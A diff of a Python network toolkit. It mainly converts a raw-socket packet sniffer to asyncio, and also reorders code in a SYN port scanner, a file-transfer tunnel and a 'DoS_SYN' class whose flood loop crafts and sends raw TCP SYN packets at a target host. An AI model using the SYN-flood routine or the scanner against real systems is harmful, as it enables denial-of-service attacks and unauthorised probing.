@@ -3,6 +3,7 @@ import socket
 import asyncio
 import struct
 import signal
+import ctypes
 import ssl
 import sys
 import os
@@ -16,10 +17,12 @@ class Constant :
     ISROOT : bool = os.geteuid() == 0
     TIME : int = round(time.time())
     ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
+    COUNTER : int = ctypes.c_int(0)
     SUP_COLOR : bool = True if os.getenv("COLORTERM") in ("truecolor", "24bit", "color24") and os.getenv("NOCOLOR") in (None, 0, "false", "no") else False
     SLASH : str = chr(47)
     ESCAPE : str = chr(27)
     TOOLS : dict = dict()
+    FILES : list = list()
     INFO : str = f"""\n
         [System] : [{sys.platform.upper()}, {time.ctime()}]
         [Hostname] : [{socket.gethostname()}, PID {os.getpid()}]
@@ -37,6 +40,10 @@ class Constant :
         EXCEPTION : None = lambda error : print("\n\n[" + Constant.RED("!") + "]" + f" Error : {error or None}", file = sys.stderr)
         msg = Constant.RED(" **SIGNAL** ")
         msg += "\n\n" + f"sig_num : {Constant.YELLOW(signal.Signals(signum).name)}"
+        for file in Constant.FILES :
+            msg += "\n" + f"process_stat : closing file (name : {file.name}, mode : {file.mode})"
+            if not file.closed : file.close()
+            msg += " " + "closed"
         msg += "\n" + f"process_stat : func {Constant.YELLOW(func_name)} in line {Constant.YELLOW(func_line)} with stacksize {Constant.YELLOW(stack_size)}\n"
         EXCEPTION(msg)
         Constant.EXIT(1)
@@ -61,16 +68,42 @@ class Constant :
         return ":".join([f"{sec:02x}" for sec in mac])
 
 
+class Stack :
+    def __init__(self, stack : list) -> "Stack_class" :
+        self.__stack = stack
+
+    def stack_is_empty(self) -> bool :
+        return True if not self.__stack else False
+
+    def stack_size(self) -> int :
+        return len(self.__stack)
+
+    async def stack(self) -> list :
+        new_stack = self.__stack[::]
+        new_stack.reverse()
+        return new_stack
+
+    async def pop(self) -> "any" :
+        self.__stack.reverse()
+        value = self.__stack.pop()
+        self.__stack.reverse()
+        return value
+
+    async def add(self, value : "any") -> None :
+        self.__stack.append(value)
+        return
+
 class Sniff :
-    def __init__(self, iface : str, parse : bool, tmp : bool, saddr : str, daddr : str) -> "Sniff_class" :
+    def __init__(self, loop : "async_event_loop", iface : str, tmp : bool, saddr : str, daddr : str, recvbuf : int) -> "Sniff_class" :
+        self.loop = loop
         self.iface = iface
-        self.parse = parse
         self.tmp = tmp
         self.saddr = saddr
         self.daddr = daddr
-        self.generator = None
-        self.check_interface()
-        self.check_eth_p_all()
+        self.__counter = Constant.COUNTER
+        self.bufstack = Stack(list())
+        self.sock_recvbuf = recvbuf
+        self.tmp_file = None
 
     def __repr__(self) -> str :
         items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
@@ -79,163 +112,21 @@ class Sniff :
     def __str__(self) -> str :
         return f"Sniff : \n\t{self.iface}"
 
-    def __iter__(self) -> "Sniff_iteration" :
-        self.generator = self.sniff()
-        return self
+    @property
+    def count(self) -> int :
+        return self.__counter.value
 
-    def __next__(self) -> tuple[str | None, memoryview | None] :
-        try :
-            return next(self.generator)
-        except StopIteration :
-            self.generator = None
-            raise StopIteration
-
-    def parse_eth_header(self, data : memoryview | bytes) -> tuple[str, str | int] :
-        parsed_header = str()
-        t = "\n\t\t"
-        dst, src, typ = self.eth_header(data)
-        parsed_header += f"Ethernet Frame :{t}Source MAC : {src}{t}Destination MAC : {dst}{t}Ethernet Type : {typ}"
-        return parsed_header, typ
-
-    def parse_arp_header(self, data : memoryview | bytes) -> str :
-        parsed_header = str()
-        t = "\n\t\t"
-        hdr, prt, hln, pln, opc, sha, spa, tha, tpa = self.arp_header(data)
-        parsed_header += f"Arp Datagram :{t}Hardware Type : {hdr}{t}Protocol Type : {prt}{t}Hardware Length : {hln}"
-        parsed_header += f"{t}Protocol Length : {pln}{t}Opcode : {opc}{t}Sender Hardware Address : {sha}"
-        parsed_header += f"{t}Sender Protocol Address : {spa}{t}Target Hardware Address : {tha}"
-        parsed_header += f"{t}Target Protocol Address : {tpa}"
-        return parsed_header
-
-    def parse_ip_header(self, data : memoryview | bytes) -> tuple[str, int, str | int] :
-        parsed_header = str()
-        t = "\n\t\t"
-        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = self.ip_header(data)
-        parsed_header += f"IPv4 Datagram :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
-        parsed_header += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
-        parsed_header += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
-        parsed_header += f"{t}Checksum : {csm}  Source : {src}  Destination : {dst}"
-        return parsed_header, ihl, prt
-
-    def parse_tcp_header(self, data : memoryview | bytes) -> str :
-        parsed_header = str()
-        t = "\n\t\t"
-        src_p, dst_p, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(data)
-        parsed_header += f"TCP Segment :{t}Source Port : {src_p}{t}Destination Port : {dst_p}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}\t"
-        parsed_header += f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}{t}"
-        parsed_header += f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{self.indent_data(data)}"
-        return parsed_header
-
-    def parse_udp_header(self, data : memoryview | bytes) -> str :
-        parsed_header = str()
-        t = "\n\t\t"
-        src_p, dst_p, tln, csm, data = self.udp_header(data)
-        parsed_header += f"UDP Segment :{t}Source Port : {src_p}{t}Destination Port : {dst_p}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.indent_data(data)}"
-        return parsed_header
-
-    def parse_icmp_header(self, data : memoryview | bytes) -> str :
-        parsed_header = str()
-        t = "\n\t\t"
-        typ, cod, csm, idn, seq, data = self.icmp_header(data)
-        parsed_header += f"ICMP Datagram :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.indent_data(data)}"
-        return parsed_header
-
-    def parse_headers(self, raw_data : memoryview | bytes) -> str :
-        parsed_headers = str()
-        spec_header = f"[+][DATALINK]________________{Constant.TIME}________________"
-        eth_data = raw_data[:14]
-        parsed_eth_header, typ = self.parse_eth_header(eth_data)
-        match typ :
-            case "IPv4" :
-                ip_data = raw_data[14:]
-                parsed_ip_header, ihl, prt = self.parse_ip_header(ip_data)
-                match prt :
-                    case "TCP" :
-                        tcp_data = raw_data[14 + ihl:]
-                        transport_layer_header = self.parse_tcp_header(tcp_data)
-                    case "UDP" :
-                        udp_data = raw_data[14 + ihl:]
-                        transport_layer_header = self.parse_udp_header(udp_data)
-                    case "ICMP" :
-                        icmp_data = raw_data[14 + ihl:]
-                        transport_layer_header = self.parse_icmp_header(icmp_data)
-                    case _ :
-                        transport_layer_header = f"{prt} : unimplemented transport layer protocol"
-                parsed_headers += spec_header
-                parsed_headers += "\n\n"
-                parsed_headers += parsed_eth_header
-                parsed_headers += "\n\n"
-                parsed_headers += parsed_ip_header
-                parsed_headers += "\n\n"
-                parsed_headers += transport_layer_header
-                parsed_headers += "\n\n"
-                return parsed_headers
-            case "ARP" :
-                arp_data = raw_data[14:]
-                parsed_arp_header = self.parse_arp_header(arp_data)
-                parsed_headers += spec_header
-                parsed_headers += "\n\n"
-                parsed_headers += parsed_eth_header
-                parsed_headers += "\n\n"
-                parsed_headers += parsed_arp_header
-                parsed_headers += "\n\n"
-                return parsed_headers
-            case _ :
-                parsed_headers += spec_header
-                parsed_headers += "\n\n"
-                parsed_headers += parsed_eth_header
-                parsed_headers += "\n\n"
-                parsed_headers += f"{typ} : unimplemented network layer protocol"
-                parsed_headers += "\n\n"
-                return parsed_headers
-
-    def check_interface(self) -> None :
-        ifaces = [iface[-1] for iface in socket.if_nameindex()]
-        if self.iface not in ifaces :
-            raise OSError(f"{self.iface} not in {ifaces}")
-        self.iface = self.iface.encode()
+    @count.setter
+    def count(self, value : int) -> None :
+        self.__counter.value = value
         return
 
-    def check_ip(self, frame : memoryview | bytes) -> bool :
-        typ = bytes(frame[12:14]).hex()
-        return typ == "0800"
-
-    def check_saddr_ip(self, frame : memoryview | bytes) -> bool :
-        src = ".".join((str(i) for i in tuple(frame[14:][12:16])))
-        return src == self.saddr
-
-    def check_daddr_ip(self, frame : memoryview | bytes) -> bool :
-        dst = ".".join((str(i) for i in tuple(frame[14:][16:20])))
-        return dst == self.daddr
-
-    def check_eth_p_all(self) -> None :
-        if "ETH_P_ALL" not in socket.__all__ :
-            socket.ETH_P_ALL = 3
-        return
-
-    def filter(func : "func") -> tuple[str | None, memoryview | None] :
-        def filter(self) -> tuple[str | None, memoryview] :
-            frame = func(self)
-            nonce = 0
-            if not (self.saddr or self.daddr) :
-                return (self.parse_headers(frame).expandtabs(4) if self.parse else str(), frame)
-            if not self.check_ip(frame) :
-                return (None, None)
-            if self.saddr :
-                nonce += 1 if self.check_saddr_ip(frame) else -1
-            if self.daddr :
-                nonce += 1 if self.check_daddr_ip(frame) else -1
-            if nonce > 0 :
-                return (self.parse_headers(frame).expandtabs(4) if self.parse else str(), frame)
-            else : return (str(), bytes())
-        return filter
-
-    def sniff(self) -> tuple[str | None, memoryview] :
-        while True :
-            yield self.__sniff()
+    @property
+    async def stack(self) -> list :
+        return await self.bufstack.stack()
 
     @staticmethod
-    def eth_header(raw_payload : bytes) -> tuple[str, str, str | int] :
+    async def eth_header(raw_payload : bytes) -> tuple[str, str, str | int] :
         payload = struct.unpack("!6s6sH", raw_payload)
         standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
         dst = standardize_mac_addr(payload[0])
@@ -249,7 +140,7 @@ class Sniff :
         return dst, src, typ
 
     @staticmethod
-    def ip_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, int, int, int, str | int, int, str, str] :
+    async def ip_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, int, int, int, str | int, int, str, str] :
         payload = struct.unpack("!BBHHHBBH4s4s", raw_payload[:20])
         ver = payload[0] >> 4
         ihl = (payload[0] & 0xf) * 4
@@ -271,7 +162,7 @@ class Sniff :
         return ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst
 
     @staticmethod
-    def arp_header(raw_payload : memoryview | bytes) -> tuple[str | int, str | int, int, int, str | int, str, str, str, str] :
+    async def arp_header(raw_payload : memoryview | bytes) -> tuple[str | int, str | int, int, int, str | int, str, str, str, str] :
         payload = struct.unpack("!HHBBH6s4s6s4s", raw_payload[:28])
         standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
         hdr = "Ethernet(1)" if payload[0] == 1 else payload[0]
@@ -294,7 +185,7 @@ class Sniff :
         return hdr, prt, hln, pln, opc, sha, spa, tha, tpa
 
     @staticmethod
-    def tcp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, dict, int, int, int, memoryview | bytes] :
+    async def tcp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, dict, int, int, int, memoryview | bytes] :
         payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
         src_p = payload[0]
         dst_p = payload[1]
@@ -323,7 +214,7 @@ class Sniff :
         return src_p, dst_p, seq, acn, oft, flg, win, csm, urg, data
 
     @staticmethod
-    def udp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, memoryview | bytes] :
+    async def udp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, memoryview | bytes] :
         payload = struct.unpack("!HHHH", raw_payload[:8])
         src_p = payload[0]
         dst_p = payload[1]
@@ -333,7 +224,7 @@ class Sniff :
         return src_p, dst_p, tln, csm, data
 
     @staticmethod
-    def icmp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, memoryview | bytes] :
+    async def icmp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, memoryview | bytes] :
         payload = struct.unpack("!BBHHH", raw_payload[:8])
         typ = payload[0]
         cod = payload[1]
@@ -344,7 +235,7 @@ class Sniff :
         return typ, cod, csm, idn, seq, data
 
     @staticmethod
-    def indent_data(data : memoryview | bytes) -> str : #TODO : think this algorithm is too slow because of insert()
+    async def indent_data(data : memoryview | bytes) -> str :
         data = data.tolist()
         for i in range(len(data)) :
             if data[i] not in range(32, 127) : data[i] = 46
@@ -361,21 +252,192 @@ class Sniff :
             data.insert(0, 9)
         return bytes(data).decode()
 
-    @staticmethod
-    def tmp_file(data : str) -> None :
-        path = f"data_{Constant.TIME}.txt"
-        mode = "a" if os.path.exists(path) else "x"
-        print(data, file = open(path, mode))
+    async def parse_eth_header(self, data : memoryview | bytes) -> tuple[str, str | int] :
+        parsed_header = str()
+        t = "\n\t\t"
+        dst, src, typ = await self.eth_header(data)
+        parsed_header += f"Ethernet Frame :{t}Source MAC : {src}{t}Destination MAC : {dst}{t}Ethernet Type : {typ}"
+        return parsed_header, typ
+
+    async def parse_arp_header(self, data : memoryview | bytes) -> str :
+        parsed_header = str()
+        t = "\n\t\t"
+        hdr, prt, hln, pln, opc, sha, spa, tha, tpa = await self.arp_header(data)
+        parsed_header += f"Arp Datagram :{t}Hardware Type : {hdr}{t}Protocol Type : {prt}{t}Hardware Length : {hln}"
+        parsed_header += f"{t}Protocol Length : {pln}{t}Opcode : {opc}{t}Sender Hardware Address : {sha}"
+        parsed_header += f"{t}Sender Protocol Address : {spa}{t}Target Hardware Address : {tha}"
+        parsed_header += f"{t}Target Protocol Address : {tpa}"
+        return parsed_header
+
+    async def parse_ip_header(self, data : memoryview | bytes) -> tuple[str, int, str | int] :
+        parsed_header = str()
+        t = "\n\t\t"
+        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = await self.ip_header(data)
+        parsed_header += f"IPv4 Datagram :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
+        parsed_header += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
+        parsed_header += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
+        parsed_header += f"{t}Checksum : {csm}  Source : {src}  Destination : {dst}"
+        return parsed_header, ihl, prt
+
+    async def parse_tcp_header(self, data : memoryview | bytes) -> str :
+        parsed_header = str()
+        t = "\n\t\t"
+        src_p, dst_p, seq, acn, oft, flg, win, csm, urg, data = await self.tcp_header(data)
+        data = await self.indent_data(data)
+        parsed_header += f"TCP Segment :{t}Source Port : {src_p}{t}Destination Port : {dst_p}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}\t"
+        parsed_header += f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}{t}"
+        parsed_header += f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{data}"
+        return parsed_header
+
+    async def parse_udp_header(self, data : memoryview | bytes) -> str :
+        parsed_header = str()
+        t = "\n\t\t"
+        src_p, dst_p, tln, csm, data = await self.udp_header(data)
+        data = await self.indent_data(data)
+        parsed_header += f"UDP Segment :{t}Source Port : {src_p}{t}Destination Port : {dst_p}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{data}"
+        return parsed_header
+
+    async def parse_icmp_header(self, data : memoryview | bytes) -> str :
+        parsed_header = str()
+        t = "\n\t\t"
+        typ, cod, csm, idn, seq, data = await self.icmp_header(data)
+        data = await self.indent_data(data)
+        parsed_header += f"ICMP Datagram :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{data}"
+        return parsed_header
+
+    async def parse_headers(self, raw_data : memoryview | bytes) -> str :
+        parsed_headers = str()
+        spec_header = f"[{self.count}][DATALINK_FRAME]________________{Constant.TIME}________________"
+        self.count += 1
+        eth_data = raw_data[:14]
+        parsed_eth_header, typ = await self.parse_eth_header(eth_data)
+        match typ :
+            case "IPv4" :
+                ip_data = raw_data[14:]
+                parsed_ip_header, ihl, prt = await self.parse_ip_header(ip_data)
+                match prt :
+                    case "TCP" :
+                        tcp_data = raw_data[14 + ihl:]
+                        transport_layer_header = await self.parse_tcp_header(tcp_data)
+                    case "UDP" :
+                        udp_data = raw_data[14 + ihl:]
+                        transport_layer_header = await self.parse_udp_header(udp_data)
+                    case "ICMP" :
+                        icmp_data = raw_data[14 + ihl:]
+                        transport_layer_header = await self.parse_icmp_header(icmp_data)
+                    case _ :
+                        transport_layer_header = f"{prt} : unimplemented transport layer protocol"
+                parsed_headers += spec_header
+                parsed_headers += "\n\n"
+                parsed_headers += parsed_eth_header
+                parsed_headers += "\n\n"
+                parsed_headers += parsed_ip_header
+                parsed_headers += "\n\n"
+                parsed_headers += transport_layer_header
+                parsed_headers += "\n\n"
+                return parsed_headers
+            case "ARP" :
+                arp_data = raw_data[14:]
+                parsed_arp_header = await self.parse_arp_header(arp_data)
+                parsed_headers += spec_header
+                parsed_headers += "\n\n"
+                parsed_headers += parsed_eth_header
+                parsed_headers += "\n\n"
+                parsed_headers += parsed_arp_header
+                parsed_headers += "\n\n"
+                return parsed_headers
+            case _ :
+                parsed_headers += spec_header
+                parsed_headers += "\n\n"
+                parsed_headers += parsed_eth_header
+                parsed_headers += "\n\n"
+                parsed_headers += f"{typ} : unimplemented network layer protocol"
+                parsed_headers += "\n\n"
+                return parsed_headers
+
+    async def check_interface(self) -> None :
+        ifaces = [iface[-1] for iface in socket.if_nameindex()]
+        if self.iface not in ifaces :
+            raise OSError(f"{self.iface} not in {ifaces}")
+        self.iface = self.iface.encode()
         return
 
-    @filter
-    def __sniff(self) -> tuple[str | None, memoryview] :
+    async def check_ip(self, frame : memoryview | bytes) -> bool :
+        typ = bytes(frame[12:14]).hex()
+        return typ == "0800"
+
+    async def check_saddr_ip(self, frame : memoryview | bytes) -> bool :
+        src = ".".join((str(i) for i in tuple(frame[14:][12:16])))
+        return src == self.saddr
+
+    async def check_daddr_ip(self, frame : memoryview | bytes) -> bool :
+        dst = ".".join((str(i) for i in tuple(frame[14:][16:20])))
+        return dst == self.daddr
+
+    async def check_eth_p_all(self) -> None :
+        if "ETH_P_ALL" not in socket.__all__ :
+            socket.ETH_P_ALL = 3
+        return
+
+    async def filter(self, frame : memoryview | bytes) -> bool :
+            nonce = 0
+            if not (self.saddr or self.daddr) :
+                return True
+            if not await self.check_ip(frame) :
+                return False
+            if self.saddr :
+                nonce += 1 if await self.check_saddr_ip(frame) else -1
+            if self.daddr :
+                nonce += 1 if await self.check_daddr_ip(frame) else -1
+            if nonce > 0 :
+                return True
+            else : return False
+
+    async def outputctl(self) -> None :
+        if not self.bufstack.stack_is_empty() :
+            frame = await self.bufstack.pop()
+            filter = await self.filter(frame)
+            if filter :
+                parsed_header = await self.parse_headers(frame)
+                parsed_header = parsed_header.expandtabs(4)
+                if self.tmp :
+                    await asyncio.to_thread(self.write, parsed_header)
+                print(parsed_header)
+        return
+
+    def write(self, data : str) -> None :
+        self.tmp_file.write(data)
+        return
+
+    async def create_file(self) -> "file" :
+        path = f"data_{Constant.TIME}.txt"
+        mode = "a" if os.path.exists(path) else "x"
+        file = open(path, mode)
+        Constant.FILES.append(file)
+        return file
+
+    async def add_to_stack(self, value : memoryview | bytes) -> None :
+        await self.bufstack.add(value)
+        return
+
+    async def sniff(self) -> None :
+        await self.check_interface()
+        await self.check_eth_p_all()
+        if self.tmp :
+            async_file = await self.create_file()
+            self.tmp_file = async_file
+        await asyncio.gather(asyncio.create_task(self.__sniff()))
+        return
+
+    async def __sniff(self) -> None :
         with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.ETH_P_ALL)) as sniff :
             sniff.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, self.iface)
             while True :
-                raw_data = sniff.recvfrom(65535)[0]
-                raw_data_memview = memoryview(raw_data)
-                if raw_data : return raw_data_memview
+                raw_data = await self.loop.sock_recvfrom(sniff, self.sock_recvbuf)
+                raw_data_memview = memoryview(raw_data[0])
+                if raw_data : await self.add_to_stack(raw_data_memview)
+                await self.outputctl()
+            return
 
 class Scan :
     def __init__(self, source : str, host : str, timeout : int, event_loop : "async_event_loop") -> "Scan_class" :
@@ -393,6 +455,33 @@ class Scan :
 
     def __str__(self) -> str :
         return f"Scan : \n\t{self.host}\n\t{self.port}\n\t{self.timeout}"
+
+    @staticmethod
+    def is_open_port(tcp_header : bytes) -> bool :
+         flags = tcp_header[13:14]
+         ack_syn = bytes(flags).hex() == "12"
+         return True if ack_syn else False
+
+    @staticmethod
+    def check_acknum(acn : int, tcp_header : bytes) -> bool :
+        acknum_byte = tcp_header[8:12]
+        return True if int(bytes(acknum_byte).hex(), base = 16) - 1 == acn else False
+
+    @staticmethod
+    def ip_header(src : str, dst : str, idn : int = 0, csm : int = 0) -> bytes :
+        return DoS_SYN.ip_header(src = src, dst = dst, idn = idn, csm = csm)
+
+    @staticmethod
+    def tcp_header(src_p : int = 0, dst_p : int = 0, seq : int = 0, syn = 0, csm : int = 0) -> bytes :
+        return DoS_SYN.tcp_header(src_p = src_p, dst_p = dst_p, seq = seq, syn = 1, csm = csm)
+
+    @staticmethod
+    def pseudo_header(src : str, dst : str, pln : int = 0) -> bytes :
+        return DoS_SYN.pseudo_header(src = src, dst = dst, pln = pln)
+
+    @staticmethod
+    def checksum(data : bytes) -> int :
+        return DoS_SYN.checksum(data)
 
     def ipv4_header(self) -> bytes :
         src = socket.inet_pton(socket.AF_INET, self.source)
@@ -442,33 +531,6 @@ class Scan :
     async def scan(self, port : int) -> tuple[bool, bool] :
         return await self.__scan(port)
 
-    @staticmethod
-    def is_open_port(tcp_header : bytes) -> bool :
-         flags = tcp_header[13:14]
-         ack_syn = bytes(flags).hex() == "12"
-         return True if ack_syn else False
-
-    @staticmethod
-    def check_acknum(acn : int, tcp_header : bytes) -> bool :
-        acknum_byte = tcp_header[8:12]
-        return True if int(bytes(acknum_byte).hex(), base = 16) - 1 == acn else False
-
-    @staticmethod
-    def ip_header(src : str, dst : str, idn : int = 0, csm : int = 0) -> bytes :
-        return DoS_SYN.ip_header(src = src, dst = dst, idn = idn, csm = csm)
-
-    @staticmethod
-    def tcp_header(src_p : int = 0, dst_p : int = 0, seq : int = 0, syn = 0, csm : int = 0) -> bytes :
-        return DoS_SYN.tcp_header(src_p = src_p, dst_p = dst_p, seq = seq, syn = 1, csm = csm)
-
-    @staticmethod
-    def pseudo_header(src : str, dst : str, pln : int = 0) -> bytes :
-        return DoS_SYN.pseudo_header(src = src, dst = dst, pln = pln)
-
-    @staticmethod
-    def checksum(data : bytes) -> int :
-        return DoS_SYN.checksum(data)
-
     async def __scan(self, port : int) -> tuple[bool, bool] :
         status, response = await self.send(port)
         if status :
@@ -489,6 +551,7 @@ class DoS_SYN :
         self.host = host
         self.port = int(port)
         self.rate = rate
+        self.__counter = Constant.COUNTER
 
     def __repr__(self) -> str :
         items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
@@ -497,27 +560,13 @@ class DoS_SYN :
     def __str__(self) -> str :
         return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"
 
-    def package(self) -> bytes :
-        randip = self.random_ip()
-        randnum = lambda x, y : random.randint(x, y)
-        src = socket.inet_pton(socket.AF_INET, "192.168.129.207")
-        dst = socket.inet_pton(socket.AF_INET, self.host)
-        randidn = randnum(0, 65535)
-        ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
-        checksum = self.checksum(ip_header)
-        ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
-        randseq = randnum(0, 65535)
-        randsrp = randnum(1024, 65535)
-        tcp_header = self.tcp_header(src_p = randsrp, dst_p = self.port, seq = randseq, syn = 1)
-        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
-        data = tcp_header + pseudo_header
-        tcp_checksum = self.checksum(data)
-        tcp_header = self.tcp_header(src_p = randsrp, dst_p = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
-        payload = ip_header + tcp_header
-        return payload
+    @property
+    def count(self) -> int :
+        return self.__counter.value
 
-    def flood(self) -> None :
-        self.__flood()
+    @count.setter
+    def count(self, value : int) -> None :
+        self.__counter.value = value
         return
 
     @staticmethod
@@ -577,17 +626,39 @@ class DoS_SYN :
         now = x // sec
         return now * symbol
 
+    def package(self) -> bytes :
+        randip = self.random_ip()
+        randnum = lambda x, y : random.randint(x, y)
+        src = socket.inet_pton(socket.AF_INET, "192.168.129.207")
+        dst = socket.inet_pton(socket.AF_INET, self.host)
+        randidn = randnum(0, 65535)
+        ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
+        checksum = self.checksum(ip_header)
+        ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
+        randseq = randnum(0, 65535)
+        randsrp = randnum(1024, 65535)
+        tcp_header = self.tcp_header(src_p = randsrp, dst_p = self.port, seq = randseq, syn = 1)
+        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
+        data = tcp_header + pseudo_header
+        tcp_checksum = self.checksum(data)
+        tcp_header = self.tcp_header(src_p = randsrp, dst_p = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
+        payload = ip_header + tcp_header
+        return payload
+
+    def flood(self) -> None :
+        self.__flood()
+        return
+
     def __flood(self) -> None :
-        count = 0
-        while count != self.rate :
+        while self.count != self.rate :
             payload = self.package()
             with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
                 flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                 flood.connect((self.host, self.port))
                 flood.sendto(payload, (self.host, self.port))
                 flood.shutdown(socket.SHUT_RDWR)
-            count += 1
-            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(count, self.rate)}" + " " + f"[{count}/{self.rate}]"
+            self.count += 1
+            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(self.count, self.rate)}" + " " + f"[{self.count}/{self.rate}]"
             print(text, end = "\r", flush = True)
         else :
             end_time = round((time.time() - Constant.TIME), 2)
@@ -669,28 +740,13 @@ class Tunnel :
     def __str__(self) -> str :
         return f"Tunnel : \n\t{self.host}\n\t{self.port}"
 
-    def tunnel(self) -> None :
-        self.__tunnel()
-        return
-
-    def init_server(self) -> None :
-        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.sock.settimeout(self.timeout)
-        self.sock.bind((self.host, self.port))
-        self.sock.listen(1)
-        return
-
-    def get_header(self, sock : socket.socket) -> str :
-        header = bytes()
-        while not header.endswith(b"\r\n\r\n") :
-            header += self.readline(sock)
-        else : return header.decode()
-
     @staticmethod
     def open_file(name : str) -> "file" :
         path = f"./{name}"
         mode = "ab" if os.path.exists(path) else "wb"
-        return open(path, mode)
+        file = open(path, mode)
+        Constant.FILES.append(file)
+        return file
 
     @staticmethod
     def tmp_file(file : "open", data : bytes) -> None :
@@ -791,6 +847,23 @@ class Tunnel :
     def percent(x : int, y : int) -> int :
         return round((x / y) * 100)
 
+    def init_server(self) -> None :
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.settimeout(self.timeout)
+        self.sock.bind((self.host, self.port))
+        self.sock.listen(1)
+        return
+
+    def get_header(self, sock : socket.socket) -> str :
+        header = bytes()
+        while not header.endswith(b"\r\n\r\n") :
+            header += self.readline(sock)
+        else : return header.decode()
+
+    def tunnel(self) -> None :
+        self.__tunnel()
+        return
+
     def __tunnel(self) -> None :
         print("[" + Constant.GREEN("+") + "]" + " " + "run init_server()", end = "  ", flush = True)
         self.init_server()
@@ -821,6 +894,7 @@ class Tunnel :
         else :
             data = self.readbuffer(conn, tail)
             self.tmp_file(file, data)
+            file.close()
             send_length += tail
             print(OUTPUT(send_length, length), end = "\r", flush = True)
             print("\n[" + Constant.GREEN("+") + "]" + " " + f"sending OK to {addr[0]}:{addr[-1]}", end = "  ", flush = True)
@@ -842,6 +916,7 @@ if not Constant.MODULE :
         sniff_tool.add_argument("-s", "--saddr", type = str, help = "process IPv4 header with specified saddr", default = None)
         sniff_tool.add_argument("-d", "--daddr", type = str, help = "process IPv4 header with specified daddr", default = None)
         sniff_tool.add_argument("-t", "--tmp", action = "store_true", help = "tmps sniffed packets in file", default = False)
+        sniff_tool.add_argument("-b", "--buffer", type = int,  help = "sets socket.recvfrom buffer", default = 64 * 1024)
         sniff_tool.set_defaults(func = Sniff_args)
         scan_tool = subparser.add_parser("scan", help = "execute SYN port scanner")
         scan_tool.add_argument("-s", "--source", type = str, help = "sets source addr for scanning")
@@ -909,7 +984,8 @@ if not Constant.MODULE :
             "iface" : args.iface,
             "filter_saddr" : args.saddr,
             "filter_daddr" : args.daddr,
-            "tmp" : args.tmp
+            "tmp" : args.tmp,
+            "buffer" : args.buffer
             }
         success, nones = check(iface = args["iface"])
         if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
@@ -917,12 +993,11 @@ if not Constant.MODULE :
         filter_saddr = args["filter_saddr"]
         filter_daddr = args["filter_daddr"]
         tmp = args["tmp"]
+        buffer = args["buffer"]
         if not Constant.ISROOT : root_access_error()
         ensure()
-        sniff = Sniff(iface, True, tmp, filter_saddr, filter_daddr)
-        for packet, _ in sniff :
-            print(packet)
-        return
+        sniff = Sniff(asyncio.get_event_loop(), iface, tmp, filter_saddr, filter_daddr, buffer)
+        asyncio.run(sniff.sniff())
 
     def Scan_args() -> None :
         global args
